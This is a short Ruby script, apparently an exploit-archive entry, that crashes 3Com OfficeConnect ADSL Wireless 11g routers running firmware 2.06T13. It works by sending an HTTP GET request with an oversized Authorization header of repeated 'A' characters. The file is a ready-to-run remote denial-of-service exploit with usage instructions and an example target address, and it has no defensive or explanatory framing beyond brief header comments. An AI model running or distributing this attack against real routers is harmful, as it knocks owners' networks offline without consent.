###############
# Model -> Tested on 3Com OfficeConnect ADSL Wireless 11g Firewall Router 3CRWDR100A-72 and 3CRWDR100Y-72
# Software Version -> Tested on 2.06T13 (Apr 2007, last version for these routers)
# Attacker -> Tested from GNU/Linux (Sidux and Ubuntu)
#
# Exploit languaje -> Ruby
# Type -> Remote Denial of Service Exploit by HTTP
#
# Additional info:
# - I tested it in other similar 3Com router and the system do not crash, but the Internet connection yes.
# - The bug can be exploited with Tamper Data (Firefox Addon) too, LOL.
#
###############
# Discovered and written by Alberto Ortega
# http://pentbox.net/
###############

require "socket"

host = ARGV[0]
buffer = "A"
send = ""

puts ""
if !host
	puts " 3Com OfficeConnect ADSL Wireless 11g Firewall Router"
	puts " Remote DoS Exploit by HTTP"
	puts " ------ Usage ---------------------------------------"
	puts " ruby 3com_dosexploit.rb host"
	puts " Ex: ruby 3com_dosexploit.rb 192.168.1.1"
else
	begin
		socket = TCPSocket.new(host, 80)
		puts "- Exploiting ..."
		# 8.times is enough to DoS
		9.times do
			buffer = "#{buffer}#{buffer}"
		end
		# Here are the HTTP packet, Authorization value causes the DoS
		send = "GET / HTTP/1.1\r\nAuthorization:#{buffer}\r\n"
		socket.write(send)
		puts "- Successfully! :)"
	rescue
		puts "Connection problem"
	end
end
puts ""